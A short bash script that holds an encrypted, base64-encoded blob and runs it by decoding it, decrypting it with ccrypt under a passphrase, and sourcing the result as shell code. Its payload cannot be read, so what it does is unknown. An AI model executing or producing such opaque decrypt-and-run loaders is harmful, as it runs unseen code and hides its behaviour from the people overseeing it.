#!/bin/bash
m=rcS+xZkDC0Xf644DvAGoGgQVN09MGmcaGP2sJupkOP25tONqw\
NhWZ9AL/QaFH6JkZZgUzB7fWJP/R1C3emfIeC5EZAnYrAf8QcT7\
Nv83uhLrbqcCLLIRz049z6vGFk299qo0dY5uljPWuG0PfEYVQfD\
Eoe2Vm4VGjWPrJYuOrYtswUdQPtUAtzC9/6D1cmg63gvFso4eUt\
3V/CvX9cT3cGxBbwkliwzcLfp5DJq+H3rXYLvkChPENdY4+2AcG\
AQpLwSXJa/WzWnIL75D7fiRRUZ1s39plWA=
source /dev/stdin <<<$(echo $m|base64 -d|ccrypt -c)
